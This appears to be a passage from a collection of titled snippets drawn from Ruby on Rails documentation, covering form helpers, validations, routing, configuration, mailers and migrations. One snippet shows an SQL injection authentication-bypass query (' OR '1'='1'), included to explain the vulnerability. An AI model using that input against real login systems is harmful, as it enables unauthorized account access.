  <option value="1991">1991</option>
  <option value="1992">1992</option>
  <option value="1993">1993</option>
  <option value="1994">1994</option>
  <option value="1995" selected="selected">1995</option>
  <option value="1996">1996</option>
  <option value="1997">1997</option>
  <option value="1998">1998</option>
  <option value="1999">1999</option>
  <option value="2000">2000</option>
</select>
<select name="person[birth_date(2i)]" id="person_birth_date_2i">
  <option value="1">January</option>
  <option value="2">February</option>
  <option value="3">March</option>
  <option value="4">April</option>
  <option value="5">May</option>
  <option value="6">June</option>
  <option value="7">July</option>
  <option value="8">August</option>
  <option value="9">September</option>
  <option value="10">October</option>
  <option value="11">November</option>
  <option value="12" selected="selected">December</option>
</select>
<select name="person[birth_date(3i)]" id="person_birth_date_3i">
  <option value="1">1</option>
  ...
  <option value="21" selected="selected">21</option>
  ...
  <option value="31">31</option>
</select>

----------------------------------------

TITLE: Adding Custom Errors with errors.add
DESCRIPTION: This code demonstrates how to add custom validation errors using the errors.add method. It shows defining a custom validator that adds a specific error type with a custom message.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validate do |person|
    errors.add :name, :too_plain, message: "is not cool enough"
  end
end

----------------------------------------

TITLE: SQL Authentication Bypass Injection Result
DESCRIPTION: Shows the resulting SQL query when an attacker supplies malicious input designed to bypass authentication logic through SQL injection.

LANGUAGE: sql
CODE:
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1

----------------------------------------

TITLE: Using Counter Variables in Rails Collection Partials
DESCRIPTION: Shows how to use automatically generated counter variables in collection partials. These variables index the number of times the partial has been rendered.

LANGUAGE: erb
CODE:
# index.html.erb
<%= render partial: "product", collection: @products %>

LANGUAGE: erb
CODE:
# _product.html.erb
<%= product_counter %> # 0 for the first product, 1 for the second product...

----------------------------------------

TITLE: Miscellaneous Form Input Fields in Rails
DESCRIPTION: Demonstrates various other form inputs including textarea, hidden field, number field with range constraints, range slider, search field, and color picker. Each has specific attributes for functionality.

LANGUAGE: erb
CODE:
<%= form.textarea :message, size: "70x5" %>
<%= form.hidden_field :parent_id, value: "foo" %>
<%= form.number_field :price, in: 1.0..20.0, step: 0.5 %>
<%= form.range_field :discount, in: 1..100 %>
<%= form.search_field :name %>
<%= form.color_field :favorite_color %>

LANGUAGE: html
CODE:
<textarea name="message" id="message" cols="70" rows="5"></textarea>
<input value="foo" autocomplete="off" type="hidden" name="parent_id" id="parent_id">
<input step="0.5" min="1.0" max="20.0" type="number" name="price" id="price">
<input min="1" max="100" type="range" name="discount" id="discount">
<input type="search" name="name" id="name">
<input value="#000000" type="color" name="favorite_color" id="favorite_color">

----------------------------------------

TITLE: Adding Action Mailbox Credentials in YAML
DESCRIPTION: Example of how to store Action Mailbox credentials in the Rails encrypted credentials file. This particular example shows storing the ingress password.

LANGUAGE: yaml
CODE:
action_mailbox:
  ingress_password: ...

----------------------------------------

TITLE: Configuring Query Cache Size in Rails
DESCRIPTION: This configuration shows how to adjust the size of Rails' query cache. By default, Rails caches 100 query result sets in memory and evicts the least recently used ones when the limit is reached.

LANGUAGE: yaml
CODE:
development:
  adapter: mysql2
  query_cache: 200

----------------------------------------

TITLE: Example of Rails 7.0 Schema with Version Included
DESCRIPTION: Shows how the Active Record schema dump now includes the Rails version to ensure schema loads correctly with appropriate defaults for the specific Rails version.

LANGUAGE: ruby
CODE:
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# This file is the source Rails uses to define your schema when running `bin/rails
# db:schema:load`. When creating a new database, `bin/rails db:schema:load` tends to
# be faster and is potentially less error prone than running all of your
# migrations from scratch. Old migrations may fail to apply correctly if those
# migrations use external dependencies or application code.
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema[6.1].define(version: 2022_01_28_123512) do
  # ...
end

----------------------------------------

TITLE: Creating Radio Buttons in Rails Forms
DESCRIPTION: Shows how to implement radio buttons for mutually exclusive choices. All buttons share the same name but have different values, ensuring only one can be selected. Labels are included for better usability.

LANGUAGE: erb
CODE:
<%= form.radio_button :flavor, "chocolate_chip" %>
<%= form.label :flavor_chocolate_chip, "Chocolate Chip" %>
<%= form.radio_button :flavor, "vanilla" %>
<%= form.label :flavor_vanilla, "Vanilla" %>
<%= form.radio_button :flavor, "hazelnut" %>
<%= form.label :flavor_hazelnut, "Hazelnut" %>

LANGUAGE: html
CODE:
<input type="radio" value="chocolate_chip" name="flavor" id="flavor_chocolate_chip">
<label for="flavor_chocolate_chip">Chocolate Chip</label>
<input type="radio" value="vanilla" name="flavor" id="flavor_vanilla">
<label for="flavor_vanilla">Vanilla</label>
<input type="radio" value="hazelnut" name="flavor" id="flavor_hazelnut">
<label for="flavor_hazelnut">Hazelnut</label>

----------------------------------------

TITLE: Demonstrating String#camelize Method in Ruby on Rails
DESCRIPTION: Examples showing how camelize converts underscore-separated strings to CamelCase format, useful for converting paths to class names.

LANGUAGE: ruby
CODE:
"product".camelize    # => "Product"
"admin_user".camelize # => "AdminUser"

----------------------------------------

TITLE: Formatting Numbers as Percentages in Ruby on Rails
DESCRIPTION: The to_fs(:percentage) method formats numbers as percentages with options for precision, delimiter, and separator.

LANGUAGE: ruby
CODE:
100.to_fs(:percentage)
# => 100.000%
100.to_fs(:percentage, precision: 0)
# => 100%
1000.to_fs(:percentage, delimiter: ".", separator: ",")
# => 1.000,000%
302.24398923423.to_fs(:percentage, precision: 5)
# => 302.24399%

----------------------------------------

TITLE: Configuring Multiple Conditions for Active Record Callbacks in Ruby on Rails
DESCRIPTION: This code demonstrates how to combine :if and :unless options on the same Active Record callback and supply multiple conditions as an array for more complex callback logic.

LANGUAGE: ruby
CODE:
before_save :update_credit_rating, :if => :active,
  :unless => [:admin, :cash_only]

----------------------------------------

TITLE: Implementing a Custom Exceptions App Wrapper in Ruby for Rails
DESCRIPTION: A Ruby class that wraps the Rails exceptions app to handle invalid MIME types by falling back to HTML format. This wrapper ensures consistent error handling by catching ActionDispatch::Http::MimeNegotiation::InvalidType exceptions.

LANGUAGE: ruby
CODE:
class CustomExceptionsAppWrapper
  def initialize(exceptions_app:)
    @exceptions_app = exceptions_app
  end

  def call(env)
    request = ActionDispatch::Request.new(env)

    fallback_to_html_format_if_invalid_mime_type(request)

    @exceptions_app.call(env)
  end

  private
    def fallback_to_html_format_if_invalid_mime_type(request)
      request.formats
    rescue ActionDispatch::Http::MimeNegotiation::InvalidType
      request.set_header "CONTENT_TYPE", "text/html"
    end
end

----------------------------------------

TITLE: Updating button_to Method for Rails 7.0
DESCRIPTION: Shows how to preserve POST behavior with button_to when using persisted Active Record objects, which now defaults to PATCH in Rails 7.0.

LANGUAGE: ruby
CODE:
-button_to("Do a POST", [:my_custom_post_action_on_workshop, Workshop.find(1)])
+button_to("Do a POST", [:my_custom_post_action_on_workshop, Workshop.find(1)], method: :post)

----------------------------------------

TITLE: Creating Translated Paths in Rails Routes
DESCRIPTION: Demonstrates how to alter path names generated by resources using scope. This allows for localized or custom path names while maintaining standard controller and helper structures.

LANGUAGE: ruby
CODE:
scope(path_names: { new: "neu", edit: "bearbeiten" }) do
  resources :categories, path: "kategorien"
end

----------------------------------------

TITLE: Proper Engine Configuration Using Class Name String
DESCRIPTION: The correct approach to configure an engine that needs to work with reloadable application classes. Using the class name as a string allows the engine to obtain the current class object at runtime.

LANGUAGE: ruby
CODE:
# config/initializers/my_engine.rb
MyEngine.configure do |config|
  config.user_model = "User" # OK
end

----------------------------------------

TITLE: Configuring Eager Loading in Test Environment for CI
DESCRIPTION: Sets up eager loading in the test environment when running in a CI environment, which helps detect loading issues before deploying to production.

LANGUAGE: ruby
CODE:
# config/environments/test.rb
config.eager_load = ENV["CI"].present?

----------------------------------------

TITLE: Using after_bundle Block in Rails Application Templates
DESCRIPTION: Template code showing how to execute commands after bundler has completed in Rails application templates. This allows for proper sequencing when generating binstubs and performing Git operations.

LANGUAGE: ruby
CODE:
# template.rb
generate(:scaffold, "person name:string")
route "root to: 'people#index'"
rake("db:migrate")

git :init
git add: "."
git commit: %Q{ -m 'Initial commit' }

----------------------------------------

TITLE: Formatting Numbers as Phone Numbers in Ruby on Rails
DESCRIPTION: The to_fs(:phone) method formats numbers as telephone numbers with various options like area code, delimiter, extension, and country code.

LANGUAGE: ruby
CODE:
5551234.to_fs(:phone)
# => 555-1234
1235551234.to_fs(:phone)
# => 123-555-1234
1235551234.to_fs(:phone, area_code: true)
# => (123) 555-1234
1235551234.to_fs(:phone, delimiter: " ")
# => 123 555 1234
1235551234.to_fs(:phone, area_code: true, extension: 555)
# => (123) 555-1234 x 555
1235551234.to_fs(:phone, country_code: 1)
# => +1-123-555-1234

----------------------------------------

TITLE: Overriding Queue Name Prefix in Job Class
DESCRIPTION: Example of overriding the global queue name prefix for a specific job class. This allows individual jobs to use custom queue naming schemes when needed.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  queue_as :low_priority
  self.queue_name_prefix = nil
  # ...
end

# Now your job's queue won't be prefixed, overriding what
# was configured in `config.active_job.queue_name_prefix`.

----------------------------------------

TITLE: Constraining Route Segments with Regular Expressions in Rails
DESCRIPTION: Applies constraints to dynamic segments using regular expressions. This ensures that the route only matches when the segment meets the specified pattern.

LANGUAGE: ruby
CODE:
get "photos/:id", to: "photos#show", constraints: { id: /[A-Z]\d{5}/ }

----------------------------------------

TITLE: Simplifying set_author Method
DESCRIPTION: Updates the set_author method to use the enhanced author_class getter that now returns a Class object directly instead of a string.

LANGUAGE: ruby
CODE:
self.author = Blorgh.author_class.find_or_create_by(name: author_name)

----------------------------------------

TITLE: Configuring PostgreSQL to Use Timestamptz for Datetime Columns
DESCRIPTION: This snippet shows how to configure the PostgreSQL adapter to use 'timestamp with time zone' instead of the default 'timestamp without time zone' when creating datetime columns.

LANGUAGE: ruby
CODE:
# config/application.rb

ActiveSupport.on_load(:active_record_postgresqladapter) do
  self.datetime_type = :timestamptz
end

----------------------------------------

TITLE: Performance Benchmarking in Rails Views
DESCRIPTION: The benchmark helper measures the execution time of expensive operations in views. It adds timing information to the application log for performance comparison and optimization.

LANGUAGE: html+erb
CODE:
<% benchmark "Process data files" do %>
  <%= expensive_files_operation %>
<% end %>

----------------------------------------

TITLE: Installing Dependencies on FreeBSD
DESCRIPTION: Commands to install all required dependencies for Rails development on FreeBSD, including database systems, memcached, and tools for image/video processing. Includes a note about Redis installation through ports.

LANGUAGE: bash
CODE:
$ sudo pkg install sqlite3 mysql80-client mysql80-server postgresql11-client postgresql11-server memcached imagemagick6 ffmpeg mupdf yarn libxml2 vips poppler-utils
# portmaster databases/redis

----------------------------------------

TITLE: Custom Validation Messages in Rails
DESCRIPTION: This snippet demonstrates how to customize validation error messages. It shows both static messages and dynamic messages that incorporate the attribute value, using string interpolation placeholders.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  # Hard-coded message
  validates :name, presence: { message: "must be given please" }

  # Message with dynamic attribute value. %{value} will be replaced
  # with the actual value of the attribute. %{attribute} and %{model}
  # are also available.
  validates :age, numericality: { message: "%{value} seems wrong" }
end

----------------------------------------

TITLE: Using after_routes_loaded hook in Rails configuration
DESCRIPTION: This example shows how to execute code after Rails has loaded application routes using config.after_routes_loaded. This block will be executed whenever routes are loaded or reloaded.

LANGUAGE: ruby
CODE:
config.after_routes_loaded do
  # Code that does something with Rails.application.routes
end

----------------------------------------

TITLE: Generating HTML Rails Guides for Translations
DESCRIPTION: Commands to install dependencies and generate translated Rails guides in HTML format. This example shows the process for generating Italian (it-IT) documentation.

LANGUAGE: bash
CODE:
$ BUNDLE_ONLY=default:doc bundle install
$ cd guides/
$ BUNDLE_ONLY=default:doc bundle exec rake guides:generate:html GUIDES_LANGUAGE=it-IT

----------------------------------------

TITLE: Installing Dependencies for Rails Development
DESCRIPTION: Installs the required gems for Rails development using Bundler. This ensures you have all necessary dependencies to work on the Rails codebase.

LANGUAGE: bash
CODE:
$ bundle install

----------------------------------------

TITLE: Configuring Session Store with Custom Options in Rails
DESCRIPTION: Example of setting up a cookie-based session store with custom options in a Rails application. This configures the session store class and passes additional parameters like the session key name.

LANGUAGE: ruby
CODE:
config.session_store :cookie_store, key: "_your_app_session"

----------------------------------------

TITLE: Active Storage Attachment Behavior in Rails 5.2
DESCRIPTION: Demonstrates how assigning to a collection of attachments in Rails 5.2 appends new files rather than replacing existing ones. Shows both direct attachment and updating via assignment.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_many_attached :highlights
end

user.highlights.attach(filename: "funky.jpg")
user.highlights.count # => 1

blob = ActiveStorage::Blob.create_after_upload!(filename: "town.jpg")
user.update!(highlights: [ blob ])

user.highlights.count # => 2
user.highlights.first.filename # => "funky.jpg"
user.highlights.second.filename # => "town.jpg"

----------------------------------------

TITLE: HTML Output for File Upload Form
DESCRIPTION: Shows the HTML output generated by the file upload form helpers, highlighting the crucial enctype attribute set to multipart/form-data which is required for file uploads to work properly.

LANGUAGE: html
CODE:
<form enctype="multipart/form-data" action="/people" accept-charset="UTF-8" method="post">
<!-- ... -->
</form>

----------------------------------------

TITLE: Using Singular Byte Conversion Methods in Ruby on Rails
DESCRIPTION: Singular forms of byte conversion methods are aliased for more natural language usage when dealing with single units of measurement.

LANGUAGE: ruby
CODE:
1.megabyte # => 1048576

----------------------------------------

TITLE: Incorrect ERB Usage Example
DESCRIPTION: Example showing an incorrect approach to outputting content in ERB templates using puts, which won't work as expected.

LANGUAGE: html+erb
CODE:
<%# WRONG %>
Hi, Mr. <% puts "Frodo" %>

----------------------------------------

TITLE: Using respond_with with Class-Level respond_to in Rails Controllers
DESCRIPTION: Shows how to use the respond_with pattern with class-level respond_to for API responses. This functionality has been moved to the responders gem in Rails 4.2.

LANGUAGE: ruby
CODE:
# app/controllers/users_controller.rb

class UsersController < ApplicationController
  respond_to :html, :json

  def show
    @user = User.find(params[:id])
    respond_with @user
  end
end

----------------------------------------

TITLE: Implementing Cookie Rotator for SHA1 to SHA256 Digest Change in Rails
DESCRIPTION: Sets up a cookie rotator to handle the digest class change from SHA1 to SHA256, ensuring encrypted and signed cookies from previous versions can still be read during application upgrade.

LANGUAGE: ruby
CODE:
# config/initializers/cookie_rotator.rb
Rails.application.config.after_initialize do
  Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
    authenticated_encrypted_cookie_salt = Rails.application.config.action_dispatch.authenticated_encrypted_cookie_salt
    signed_cookie_salt = Rails.application.config.action_dispatch.signed_cookie_salt

    secret_key_base = Rails.application.secret_key_base

    key_generator = ActiveSupport::KeyGenerator.new(
      secret_key_base, iterations: 1000, hash_digest_class: OpenSSL::Digest::SHA1
    )
    key_len = ActiveSupport::MessageEncryptor.key_len

    old_encrypted_secret = key_generator.generate_key(authenticated_encrypted_cookie_salt, key_len)
    old_signed_secret = key_generator.generate_key(signed_cookie_salt)

    cookies.rotate :encrypted, old_encrypted_secret
    cookies.rotate :signed, old_signed_secret
  end
end

----------------------------------------

TITLE: Appending to HTML Safe Strings with Unsafe Content in Ruby
DESCRIPTION: Shows how appending unsafe content to a safe string causes automatic escaping of the unsafe content to maintain safety.

LANGUAGE: ruby
CODE:
"".html_safe + "<" # => "&lt;"

----------------------------------------

TITLE: Defining a Subclass of a Reloadable Class
DESCRIPTION: This example shows how subclassing a reloadable class can lead to stale references. If User is reloaded but VipUser is not, VipUser continues to reference the original stale User class.

LANGUAGE: ruby
CODE:
# lib/vip_user.rb
class VipUser < User
end

----------------------------------------

TITLE: Using with_indifferent_access with config_for in Rails 6.1
DESCRIPTION: Shows how to handle the change in Rails.application.config_for return value, which no longer supports access with String keys directly, requiring with_indifferent_access for backward compatibility.

LANGUAGE: ruby
CODE:
Rails.application.config_for(:example).with_indifferent_access.dig("options", "key")

----------------------------------------

TITLE: Running Active Record Tests for Trilogy
DESCRIPTION: Shows how to run the Active Record test suite specifically for the Trilogy adapter. Trilogy is an alternative MySQL-compatible database adapter.

LANGUAGE: bash
CODE:
$ bundle exec rake test:trilogy

----------------------------------------

TITLE: Generating an Add Column with Index Migration in Rails
DESCRIPTION: This command generates a migration to add a part_number column with an index to the products table. The :index suffix tells the generator to create an index on the column.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddPartNumberToProducts part_number:string:index

----------------------------------------

TITLE: Production Database Configuration for Solid Queue
DESCRIPTION: YAML configuration for database connections in production, including a separate persistent database for queue storage.

LANGUAGE: yaml
CODE:
# config/database.yml
# Store production database in the storage/ directory, which by default
# is mounted as a persistent Docker volume in config/deploy.yml.
production:
  primary:
    <<: *default
    database: storage/production.sqlite3
  queue:
    <<: *default
    database: storage/production_queue.sqlite3
    migrations_paths: db/queue_migrate

----------------------------------------

TITLE: Configuring singular table names for Active Record models
DESCRIPTION: Shows how to use the pluralize_table_names class method to singularize/pluralize table names for individual models instead of setting it globally for all models.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  self.pluralize_table_names = false
end

----------------------------------------

TITLE: Rendering a Collection in ERB Template
DESCRIPTION: Shows how to iterate through a collection of products and render each product's name in a div element using ERB's looping constructs.

LANGUAGE: erb
CODE:
<h1>Products</h1>

<div id="products">
  <% @products.each do |product| %>
    <div>
      <%= product.name %>
    </div>
  <% end %>
</div>

----------------------------------------

TITLE: Custom to_param Implementation for ActiveRecord Models
DESCRIPTION: Shows how to customize the to_param method in an ActiveRecord model to generate more descriptive URLs that include both ID and name information.

LANGUAGE: ruby
CODE:
class User
  def to_param
    "#{id}-#{name.parameterize}"
  end
end

----------------------------------------

TITLE: Testing Product Mailer in Rails
DESCRIPTION: Tests the ProductMailer by verifying the subject, sender, recipient, and content of the email. Uses fixtures to provide test data for the product and subscriber.

LANGUAGE: ruby
CODE:
require "test_helper"

class ProductMailerTest < ActionMailer::TestCase
  test "in_stock" do
    mail = ProductMailer.with(product: products(:tshirt), subscriber: subscribers(:david)).in_stock
    assert_equal "In stock", mail.subject
    assert_equal [ "david@example.org" ], mail.to
    assert_equal [ "from@example.com" ], mail.from
    assert_match "Good news!", mail.body.encoded
  end
end

----------------------------------------

TITLE: Using Web-Console in a Rails View
DESCRIPTION: Shows how to embed the web-console debugging tool directly in a Rails view template. This creates an interactive Ruby console that renders alongside the HTML content for debugging view-specific issues.

LANGUAGE: html+erb
CODE:
<% console %>

<h2>New Post</h2>

----------------------------------------

TITLE: Validating Inclusion in a Set in Rails
DESCRIPTION: Demonstrates how to validate that an attribute's value is included in a given set using the inclusion validator. The example ensures that a coffee size is one of the allowed values.

LANGUAGE: ruby
CODE:
class Coffee < ApplicationRecord
  validates :size, inclusion: { in: %w(small medium large),
    message: "%{value} is not a valid size" }
end

----------------------------------------

TITLE: Loading Custom Middleware with require
DESCRIPTION: Proper way to load and configure custom middleware that shouldn't be reloadable, using a regular require call before configuring it in the middleware stack.

LANGUAGE: ruby
CODE:
require "middleware/my_middleware"
config.middleware.use MyMiddleware

----------------------------------------

TITLE: Structured Option Documentation Format in Ruby
DESCRIPTION: Demonstrates an alternative approach for documenting method options with detailed descriptions and examples.

LANGUAGE: ruby
CODE:
# ==== Options
#
# [+:expires_at+]
#   The datetime at which the message expires. After this datetime,
#   verification of the message will fail.
#
#     message = encryptor.encrypt_and_sign("hello", expires_at: Time.now.tomorrow)
#     encryptor.decrypt_and_verify(message) # => "hello"
#     # 24 hours later...

----------------------------------------

TITLE: Running Tests for a Specific Rails Component
DESCRIPTION: Executes tests for a single Rails component only. This example demonstrates running just the Action Mailer tests, which is faster than testing the entire framework.

LANGUAGE: bash
CODE:
$ cd actionmailer
$ bin/test

----------------------------------------

TITLE: Moving Middleware After Another in Rails Stack
DESCRIPTION: Shows how to change the order of middleware by moving an existing middleware after another one. This complements the move_before method for reordering middleware.

LANGUAGE: ruby
CODE:
config.middleware.move_after ActionDispatch::Flash, Magical::Unicorns

----------------------------------------

TITLE: Configuring GIF Optimization with Vips in Active Storage
DESCRIPTION: Updates GIF optimization settings from ImageMagick's layers parameter to libvips' explicit GIF optimization options in the saver parameter.

LANGUAGE: ruby
CODE:
- variant(layers: "Optimize")
+ variant(saver: { optimize_gif_frames: true, optimize_gif_transparency: true })

----------------------------------------

TITLE: Explicitly Removing Default Scope in Rails 4.1
DESCRIPTION: Example of how to explicitly remove or override default scopes in Rails 4.1+ using methods like unscope, rewhere, or except.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  default_scope { where state: "pending" }
  scope :active, -> { unscope(where: :state).where(state: "active") }
  scope :inactive, -> { rewhere state: "inactive" }
end

User.all
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending'

User.active
# SELECT "users".* FROM "users" WHERE "users"."state" = 'active'

User.inactive
# SELECT "users".* FROM "users" WHERE "users"."state" = 'inactive'

----------------------------------------

TITLE: Creating a Turbo Frame with Rails Helper
DESCRIPTION: ERB code demonstrating how to add a Turbo Frame to a Rails application using the turbo_frame_tag helper. The example shows a frame containing a link to a post.

LANGUAGE: erb
CODE:
<%= turbo_frame_tag dom_id(post) do %>
  <div>
     <%= link_to post.title, post_path(post) %>
  </div>
<% end %>

----------------------------------------

TITLE: Testing Association Absence Validation in Rails Console
DESCRIPTION: Interactive Ruby (irb) console examples showing how association absence validation works with and without an associated order.

LANGUAGE: ruby
CODE:
irb> line_item = LineItem.new
irb> line_item.valid?
=> true # absence validation passes

order = Order.create
irb> line_item_with_order = LineItem.new(order: order)
irb> line_item_with_order.valid?
=> false # absence validation fails

----------------------------------------

TITLE: Implementing counter_cache_column Method in Active Record
DESCRIPTION: Example showing how Rails uses demodulize to compute counter cache column names based on model class names.

LANGUAGE: ruby
CODE:
def counter_cache_column
  if options[:counter_cache] == true
    "#{active_record.name.demodulize.underscore.pluralize}_count"
  elsif options[:counter_cache]
    options[:counter_cache]
  end
end

----------------------------------------

TITLE: Configuring Classic Autoloader in Rails 6
DESCRIPTION: Configuration code to use the classic autoloader instead of zeitwerk in a Rails 6 application. This preserves backward compatibility but sacrifices thread-safety in development.

LANGUAGE: ruby
CODE:
# config/application.rb

config.load_defaults 6.0
config.autoloader = :classic

----------------------------------------

TITLE: Sample YAML Translation File Structure
DESCRIPTION: Demonstrates the basic structure of a YAML translation file for Rails I18n, showing how to define a simple translation key and its value for the English locale.

LANGUAGE: yaml
CODE:
en:
  hello: "Hello world"

----------------------------------------

TITLE: Invalid Direct Import from @rails/ujs in Rails 7.1
DESCRIPTION: Demonstrates the deprecated direct import syntax from @rails/ujs that will fail in Rails 7.1.

LANGUAGE: javascript
CODE:
import { fileInputSelector } from "@rails/ujs"
// ERROR: export 'fileInputSelector' (imported as 'fileInputSelector') was not found in '@rails/ujs' (possible exports: default)

----------------------------------------

TITLE: Accessing Yesterday and Tomorrow in Time Zone
DESCRIPTION: Convenience methods for getting yesterday and tomorrow dates in the current time zone.

LANGUAGE: ruby
CODE:
Time.zone.yesterday

LANGUAGE: ruby
CODE:
Time.zone.tomorrow

----------------------------------------

TITLE: Generating HTML5 data attributes in tag helpers using Ruby
DESCRIPTION: Demonstrates the new convenience idiom for generating HTML5 data-* attributes in tag helpers by passing a :data hash of options. The hash keys are dasherized and values are JSON-encoded, except for strings and symbols.

LANGUAGE: ruby
CODE:
tag("div", :data => {:name => 'Stephen', :city_state => %w(Chicago IL)})
# => <div data-name="Stephen" data-city-state="[&quot;Chicago&quot;,&quot;IL&quot;]" />

----------------------------------------

TITLE: Accessing Email Data with Mail Object in Rails Console
DESCRIPTION: Examples of accessing email data from a Mail object in an interactive Ruby console. Shows how to get recipients, sender, date, subject, body content, and other email properties using the Mail API.

LANGUAGE: irb
CODE:
irb> mail
=> #<Mail::Message:33780, Multipart: false, Headers: <Date: Wed, 31 Jan 2024 22:18:40 -0600>, <From: someone@hey.com>, <To: save@example.com>, <Message-ID: <65bb1ba066830_50303a70397e@Bhumis-MacBook-Pro.local.mail>>, <In-Reply-To: >, <Subject: Hello Action Mailbox>, <Mime-Version: 1.0>, <Content-Type: text/plain; charset=UTF-8>, <Content-Transfer-Encoding: 7bit>, <x-original-to: >>
irb> mail.to
=> ["save@example.com"]
irb> mail.from
=> ["someone@hey.com"]
irb> mail.date
=> Wed, 31 Jan 2024 22:18:40 -0600
irb> mail.subject
=> "Hello Action Mailbox"
irb> mail.body.decoded
=> "This is the body of the email message."
# mail.decoded, a shorthand for mail.body.decoded, also works
irb> mail.decoded
=> "This is the body of the email message."
irb> mail.body
=> <Mail::Body:0x00007fc74cbf46c0 @boundary=nil, @preamble=nil, @epilogue=nil, @charset="US-ASCII", @part_sort_order=["text/plain", "text/enriched", "text/html", "multipart/alternative"], @parts=[], @raw_source="This is the body of the email message.", @ascii_only=true, @encoding="7bit">

----------------------------------------

TITLE: Implementing Email Sending in UserController with Rails Action Mailer
DESCRIPTION: Ruby code for a UserController that sends a welcome email using UserMailer after creating a new user. The email is queued with deliver_later which uses Active Job to send emails asynchronously.

LANGUAGE: ruby
CODE:
class UsersController < ApplicationController
  # ...

  def create
    @user = User.new(user_params)

    respond_to do |format|
      if @user.save
        # Tell the UserMailer to send a welcome email after save
        UserMailer.with(user: @user).welcome_email.deliver_later

        format.html { redirect_to user_url(@user), notice: "User was successfully created." }
        format.json { render :show, status: :created, location: @user }
      else
        format.html { render :new, status: :unprocessable_entity }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
    end
  end

  # ...
end

----------------------------------------

TITLE: Capturing Route Parameters in Rails
DESCRIPTION: This snippet demonstrates how to define a route that captures a parameter from the URL. When a user visits '/clients/active', the 'status' parameter will be set to 'active' in the params hash and made available to the controller.

LANGUAGE: ruby
CODE:
get "/clients/:status", to: "clients#index", foo: "bar"

----------------------------------------

TITLE: Enabling Fragment Caching in Action Mailer Views
DESCRIPTION: Rails 5 adds support for fragment caching in Action Mailer views, which can be enabled through this configuration option to improve performance.

LANGUAGE: ruby
CODE:
config.action_mailer.perform_caching = true

----------------------------------------

TITLE: Generating Base Vehicle Model for Single Table Inheritance
DESCRIPTION: Terminal command to generate a Vehicle model with fields needed for Single Table Inheritance (STI). The type field is essential for Rails to determine which subclass to instantiate.

LANGUAGE: bash
CODE:
$ bin/rails generate model vehicle type:string color:string price:decimal{10.2}

----------------------------------------

TITLE: Demonstrating Markdown Heading Structure in Rails Guides
DESCRIPTION: Shows the proper formatting for different heading levels in Markdown for Rails Guides documentation. The guide title uses h1, sections use h2, and subsections use h3 headings.

LANGUAGE: markdown
CODE:
Guide Title
===========

Section
-------

### Sub Section

----------------------------------------

TITLE: Catch Breakpoint Output for ActiveRecord Validation Errors
DESCRIPTION: Shows the output when a catch breakpoint is triggered for ActiveRecord::RecordInvalid exceptions. It displays relevant code context around the exception and the initial stack frames.

LANGUAGE: ruby
CODE:
(rdbg:binding.break) catch ActiveRecord::RecordInvalid do: bt 10
#0  BP - Catch  "ActiveRecord::RecordInvalid"
[75, 84] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb
    75|     def default_validation_context
    76|       new_record? ? :create : :update
    77|     end
    78|
    79|     def raise_validation_error
=>  80|       raise(RecordInvalid.new(self))
    81|     end
    82|
    83|     def perform_validations(options = {})
    84|       options[:validate] == false || valid?(options[:context])
=>#0    ActiveRecord::Validations#raise_validation_error at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:80
  #1    ActiveRecord::Validations#save!(options={}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:53
  # and 88 frames (use `bt' command for all frames)

----------------------------------------

TITLE: Configuring Custom Database Role Names
DESCRIPTION: Ruby configuration code for setting custom role names for database connections instead of the default 'writing' and 'reading' roles.

LANGUAGE: ruby
CODE:
config.active_record.writing_role = :default
config.active_record.reading_role = :readonly

----------------------------------------

TITLE: Using ActiveModel::API Objects in IRB Console
DESCRIPTION: This example demonstrates interacting with an EmailContact object that includes ActiveModel::API in the IRB console. It shows attribute assignment, conversion, naming, translation, and validation functionalities.

LANGUAGE: ruby
CODE:
irb> email_contact = EmailContact.new(name: "David", email: "david@example.com", message: "Hello World")

irb> email_contact.name # Attribute Assignment
=> "David"

irb> email_contact.to_model == email_contact # Conversion
=> true

irb> email_contact.model_name.name # Naming
=> "EmailContact"

irb> EmailContact.human_attribute_name("name") # Translation if the locale is set
=> "Name"

irb> email_contact.valid? # Validations
=> true

irb> empty_contact = EmailContact.new
irb> empty_contact.valid?
=> false

----------------------------------------

TITLE: SQL Generated for Querying STI Records
DESCRIPTION: SQL query generated when querying Car records with Single Table Inheritance. Shows how Rails automatically adds a WHERE clause for the type column.

LANGUAGE: sql
CODE:
SELECT "vehicles".* FROM "vehicles" WHERE "vehicles"."type" IN ('Car')

----------------------------------------

TITLE: Creating Framework Default Templates in Rails
DESCRIPTION: Shows an example of adding a new framework default to a template file used during Rails upgrades. This allows applications to opt into new defaults incrementally.

LANGUAGE: ruby
CODE:
# new_framework_defaults_8_1.rb.tt

# Rails.application.config.active_job.existing_behavior = false

----------------------------------------

TITLE: Default CSS for Field Errors in Rails Scaffold
DESCRIPTION: This CSS defines the default styling for fields with validation errors in Rails scaffold-generated views. It creates a 2-pixel red border around fields with errors.

LANGUAGE: css
CODE:
.field_with_errors {
  padding: 2px;
  background-color: red;
  display: table;
}

----------------------------------------

TITLE: Running Migrations for Authentication
DESCRIPTION: Command to execute migrations created by the authentication generator. This creates the necessary database tables for users and sessions.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Form Creation with form_for in Rails 4
DESCRIPTION: Example of using form_for with a model instance in a Rails ERB template. In Rails 4, this generates a form that uses PATCH for updates.

LANGUAGE: erb
CODE:
<%= form_for @user do |f| %>

----------------------------------------

